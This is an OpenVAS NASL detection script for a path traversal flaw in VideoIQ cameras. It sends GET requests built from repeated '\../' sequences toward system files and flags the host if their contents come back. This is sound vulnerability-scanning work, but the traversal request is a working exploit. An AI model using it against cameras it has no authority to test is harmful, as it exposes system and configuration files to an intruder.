###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_videoiq_camera_lfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# VideoIQ Camera Local File Inclusion Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:videoiq:videoiq_camera";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807356");
  script_version("$Revision: 7577 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
  script_name("VideoIQ Camera Local File Inclusion Vulnerability");

  script_tag(name:"summary", value:"The host is running VideoIQ Camera
  and is prone to local file disclosure vulnerability");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to access sensitive files or not.");

  script_tag(name:"insight", value:"The flaw exists due to an insufficient
  sanitization of user supplied input for file requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read any file system including file configurations.

  Impact Level: Application");

  script_tag(name:"affected", value:"VideoIQ Camera all Versions.");

  script_tag(name:"solution", value:"The vendor does not offer this product anymore. General solution option is to replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40284");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_videoiq_camera_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("VideoIQ/Camera/Installed");
  script_require_ports("Services/www", 8080);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

##Variable initialize
iqPort = 0;
url = "";

# Get HTTP Port
if(!iqPort = get_app_port(cpe:CPE)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  ## Construct vulnerable url 
  url = '/' + crap(data: "\../", length: 3*15) + files[file];

  ## Try attack and check the response to confirm vulnerability
  if(http_vuln_check(port:iqPort, url:url, check_header:TRUE, pattern:file))
  {
    report = report_vuln_url(port:iqPort, url:url);
    security_message(port:iqPort, data:report);
    exit(0);
  }
}
